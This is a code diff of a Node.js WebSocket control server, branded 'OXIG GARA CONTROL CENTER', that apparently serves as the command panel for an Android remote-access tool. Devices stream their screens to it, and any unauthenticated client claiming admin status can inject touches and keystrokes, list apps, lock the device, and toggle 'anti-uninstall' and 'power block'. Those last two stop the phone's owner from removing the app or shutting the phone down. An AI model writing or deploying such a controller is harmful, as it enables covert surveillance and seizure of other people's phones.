@@ -6,42 +6,55 @@ const path = require('path');
 const PORT = process.env.PORT || 3000;
 
 const server = http.createServer((req, res) => {
-    if (req.url === '/') {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+    
+    if (req.method === 'OPTIONS') {
+        res.writeHead(204);
+        res.end();
+        return;
+    }
+    
+    if (req.url === '/' || req.url === '/index.html') {
         fs.readFile(path.join(__dirname, 'admin.html'), (err, data) => {
             if (err) {
                 res.writeHead(500);
-                res.end('Server Error');
+                res.end('Server Error: ' + err.message);
                 return;
             }
             res.writeHead(200, { 'Content-Type': 'text/html' });
             res.end(data);
         });
-    } else if (req.url === '/api/devices') {
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify(getDeviceList()));
     } else {
         res.writeHead(404);
         res.end('Not Found');
     }
 });
 
-const wss = new WebSocket.Server({ server });
+const wss = new WebSocket.Server({ 
+    server,
+    // Railway এর জন্য গুরুত্বপূর্ণ
+    perMessageDeflate: false
+});
 
 let admins = new Set();
-let devices = new Map(); // ws -> deviceInfo
-let adminSessions = new Map(); // adminWs -> deviceWs
-let blockedApps = new Map(); // deviceId -> [appPackageNames]
+let devices = new Map();
 
 wss.on('connection', (ws, req) => {
+    console.log('✅ New connection from:', req.socket.remoteAddress);
+    
     ws.isAlive = true;
-    ws.on('pong', () => { ws.isAlive = true; });
+    
+    ws.on('pong', () => {
+        ws.isAlive = true;
+    });
     
     let buffer = '';
     let deviceInfo = null;
     
     ws.on('message', (data) => {
         try {
-            // Text message
             if (typeof data === 'string') {
                 buffer += data;
                 
@@ -53,30 +66,26 @@ wss.on('connection', (ws, req) => {
                         const msg = line.trim();
                         if (!msg) continue;
                         
-                        // Device registration
                         if (msg.startsWith('DEVICE:')) {
                             const parts = msg.substring(7).split('|');
                             deviceInfo = {
                                 id: parts[0],
-                                name: '📱 ' + parts[0],
-                                androidVersion: parts[1] || 'Unknown',
                                 model: parts[2] || 'Unknown',
+                                androidVersion: parts[1] || 'Unknown',
                                 apiLevel: parts[3] || 'Unknown',
                                 ip: req.socket.remoteAddress,
                                 connectedAt: Date.now()
                             };
                             devices.set(ws, deviceInfo);
-                            console.log('✅ Device:', deviceInfo.id, deviceInfo.model);
+                            console.log('✅ Device registered:', deviceInfo.id);
                             ws.send('OK:REGISTERED\n');
                             broadcastToAdmins({ type: 'device_list', devices: getDeviceList() });
                         }
-                        // Admin registration
                         else if (msg.startsWith('ADMIN:')) {
                             admins.add(ws);
+                            console.log('👤 Admin connected');
                             ws.send(JSON.stringify({ type: 'device_list', devices: getDeviceList() }));
-                            ws.send(JSON.stringify({ type: 'blocked_apps', apps: Object.fromEntries(blockedApps) }));
                         }
-                        // App list from device
                         else if (msg.startsWith('APPS:')) {
                             const appsJson = msg.substring(5);
                             try {
@@ -90,13 +99,9 @@ wss.on('connection', (ws, req) => {
                         else if (msg === 'PONG') {}
                     }
                 }
-            }
-            // Binary data (screen image)
-            else {
+            } else {
                 const buffer = Buffer.isBuffer(data) ? data : Buffer.from(data);
-                
                 if (devices.has(ws)) {
-                    // Forward to admin watching this device
                     for (const [adminWs, deviceWs] of adminSessions.entries()) {
                         if (deviceWs === ws && adminWs.readyState === WebSocket.OPEN) {
                             adminWs.send(buffer);
@@ -110,114 +115,103 @@ wss.on('connection', (ws, req) => {
     
     ws.on('close', () => {
         admins.delete(ws);
-        
         if (devices.has(ws)) {
             const info = devices.get(ws);
             console.log('❌ Device disconnected:', info.id);
             devices.delete(ws);
-            
-            for (const [adminWs, deviceWs] of adminSessions.entries()) {
-                if (deviceWs === ws) {
-                    adminSessions.delete(adminWs);
-                    if (adminWs.readyState === WebSocket.OPEN) {
-                        adminWs.send(JSON.stringify({ type: 'disconnected', deviceId: info.id }));
-                    }
-                }
-            }
             broadcastToAdmins({ type: 'device_list', devices: getDeviceList() });
         }
     });
-});
-
-// Handle admin commands
-wss.on('connection', (ws) => {
-    // Override message handler for JSON commands
-    const origHandler = ws._events?.message;
-    ws.on('message', (data) => {
-        if (typeof data === 'string' && data.startsWith('{')) {
-            try {
-                const cmd = JSON.parse(data);
-                handleAdminCommand(ws, cmd);
-            } catch(e) {}
-        }
+    
+    ws.on('error', (err) => {
+        console.error('WebSocket error:', err.message);
     });
 });
 
-function handleAdminCommand(adminWs, cmd) {
-    switch(cmd.type) {
-        case 'select_device':
-            const deviceWs = findDeviceWs(cmd.deviceId);
-            if (deviceWs) {
-                adminSessions.set(adminWs, deviceWs);
-                adminWs.send(JSON.stringify({ type: 'device_selected', deviceId: cmd.deviceId }));
-                // Send device info
-                const info = devices.get(deviceWs);
-                if (info) {
-                    adminWs.send(JSON.stringify({ type: 'device_info', info: info }));
+// Admin sessions
+let adminSessions = new Map();
+
+// Handle JSON commands from admin
+function handleJsonMessage(ws, data) {
+    try {
+        const cmd = JSON.parse(data);
+        
+        switch(cmd.type) {
+            case 'select_device':
+                for (const [dws, info] of devices.entries()) {
+                    if (info.id === cmd.deviceId) {
+                        adminSessions.set(ws, dws);
+                        ws.send(JSON.stringify({ type: 'device_selected', deviceId: cmd.deviceId }));
+                        ws.send(JSON.stringify({ type: 'device_info', info: info }));
+                        return;
+                    }
                 }
-            }
-            break;
-            
-        case 'touch':
-            forwardToDevice(cmd.deviceId, `TOUCH:${cmd.action},${cmd.x},${cmd.y}\n`, adminWs);
-            break;
-            
-        case 'key':
-            forwardToDevice(cmd.deviceId, `KEY:${cmd.keyCode}\n`, adminWs);
-            break;
-            
-        case 'block_app':
-            // Send block command to device
-            forwardToDevice(cmd.deviceId, `BLOCK:${cmd.package}\n`, adminWs);
-            // Track blocked apps
-            if (!blockedApps.has(cmd.deviceId)) blockedApps.set(cmd.deviceId, []);
-            const list = blockedApps.get(cmd.deviceId);
-            if (cmd.block && !list.includes(cmd.package)) list.push(cmd.package);
-            else if (!cmd.block) blockedApps.set(cmd.deviceId, list.filter(p => p !== cmd.package));
-            broadcastToAdmins({ type: 'blocked_apps', apps: Object.fromEntries(blockedApps) });
-            break;
-            
-        case 'get_apps':
-            forwardToDevice(cmd.deviceId, `GET_APPS\n`, adminWs);
-            break;
-            
-        case 'lock_device':
-            forwardToDevice(cmd.deviceId, `LOCK\n`, adminWs);
-            break;
-            
-        case 'anti_uninstall':
-            forwardToDevice(cmd.deviceId, `ANTI_UNINSTALL:${cmd.enable ? 1 : 0}\n`, adminWs);
-            break;
-            
-        case 'power_block':
-            forwardToDevice(cmd.deviceId, `POWER_BLOCK:${cmd.enable ? 1 : 0}\n`, adminWs);
-            break;
-    }
+                break;
+                
+            case 'touch':
+                const targetWs = adminSessions.get(ws);
+                if (targetWs && targetWs.readyState === WebSocket.OPEN) {
+                    targetWs.send(`TOUCH:${cmd.action},${cmd.x},${cmd.y}\n`);
+                }
+                break;
+                
+            case 'key':
+                const keyWs = adminSessions.get(ws);
+                if (keyWs && keyWs.readyState === WebSocket.OPEN) {
+                    keyWs.send(`KEY:${cmd.keyCode}\n`);
+                }
+                break;
+                
+            case 'get_apps':
+                const appWs = adminSessions.get(ws);
+                if (appWs && appWs.readyState === WebSocket.OPEN) {
+                    appWs.send('GET_APPS\n');
+                }
+                break;
+                
+            case 'anti_uninstall':
+                const antiWs = adminSessions.get(ws);
+                if (antiWs && antiWs.readyState === WebSocket.OPEN) {
+                    antiWs.send(`ANTI_UNINSTALL:${cmd.enable ? 1 : 0}\n`);
+                }
+                break;
+                
+            case 'power_block':
+                const powerWs = adminSessions.get(ws);
+                if (powerWs && powerWs.readyState === WebSocket.OPEN) {
+                    powerWs.send(`POWER_BLOCK:${cmd.enable ? 1 : 0}\n`);
+                }
+                break;
+                
+            case 'lock_device':
+                const lockWs = adminSessions.get(ws);
+                if (lockWs && lockWs.readyState === WebSocket.OPEN) {
+                    lockWs.send('LOCK\n');
+                }
+                break;
+        }
+    } catch(e) {}
 }
 
-function forwardToDevice(deviceId, msg, adminWs) {
-    const deviceWs = findDeviceWs(deviceId);
-    if (deviceWs && deviceWs.readyState === WebSocket.OPEN) {
-        deviceWs.send(msg);
-        adminSessions.set(adminWs, deviceWs);
-    }
-}
-
-function findDeviceWs(deviceId) {
-    for (const [ws, info] of devices.entries()) {
-        if (info.id === deviceId) return ws;
-    }
-    return null;
-}
+// Override message for admin
+const origOnMessage = wss.options;
+wss.on('connection', (ws) => {
+    const origHandler = ws._events?.message;
+    ws.on('message', (data) => {
+        if (typeof data === 'string' && data.startsWith('{')) {
+            handleJsonMessage(ws, data);
+        }
+    });
+});
 
 function getDeviceList() {
     const list = [];
     for (const [ws, info] of devices.entries()) {
         list.push({
             id: info.id,
-            name: info.name,
-            androidVersion: info.androidVersion,
+            name: '📱 ' + info.id,
             model: info.model,
+            androidVersion: info.androidVersion,
             apiLevel: info.apiLevel,
             ip: info.ip,
             appsCount: info.apps ? info.apps.length : 0,
@@ -243,14 +237,13 @@ setInterval(() => {
         ws.isAlive = false;
         ws.ping();
     });
-}, 30000);
+}, 25000);
 
 server.listen(PORT, '0.0.0.0', () => {
     console.log('┌─────────────────────────────────────┐');
     console.log('│     OXIG GARA CONTROL CENTER       │');
     console.log('│     Dev By Oxig Gara                │');
     console.log('├─────────────────────────────────────┤');
-    console.log(`│  Server: http://0.0.0.0:${PORT}              │`);
-    console.log(`│  Admin:  http://localhost:${PORT}            │`);
+    console.log(`│  Server running on port ${PORT}        │`);
     console.log('└─────────────────────────────────────┘');
 });
